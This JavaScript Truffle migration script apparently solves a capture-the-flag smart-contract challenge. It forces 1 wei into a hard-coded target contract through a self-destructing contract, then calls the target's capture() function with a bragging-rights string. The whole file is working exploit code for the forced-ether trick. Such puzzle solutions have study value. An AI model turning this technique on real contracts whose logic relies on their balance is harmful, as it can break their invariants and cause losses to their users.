const fs = require("fs-extra");
const BN = require("bn.js");

let SelfDestruct = artifacts.require("./SelfDestruct.sol");

const targetAddress = "0x0c532687EaBE667b8ba27fC024783CA9fffd1cAE";
const braggingRights = "Mad Reche was here!";

module.exports = function(deployer, network) {
  deployer
    .deploy(SelfDestruct)
    .then(() => {
      return SelfDestruct.deployed();
    })
    .then(selfDestructInstance => {
      return selfDestructInstance.selfDestruct({ value: new BN("1") });
    })
    .then(instances => {
      return web3.eth.getBalance(targetAddress);
    })
    .then(result => {
      const balance = new BN(`${result}`);

      if (balance.toNumber() === 1) {
        const abi = fs.readJsonSync("./flag.abi.json");
        const targetContractInstance = new web3.eth.Contract(
          abi,
          targetAddress
        );

        const str = web3.utils.asciiToHex(braggingRights);

        return targetContractInstance.methods
          .capture(str)
          .send({ from: "0xDCF7bAECE1802D21a8226C013f7be99dB5941bEa" });
      } else {
        console.log(`Failed: ${result}`);
      }
    })
    .then(result => {
      if (result.events.LogCaptured) {
        console.log("SUCCESS");
      } else {
        console.log("Failed");
        console.log(result);
      }
    })
    .catch(e => {
      console.error(e);
    });
};
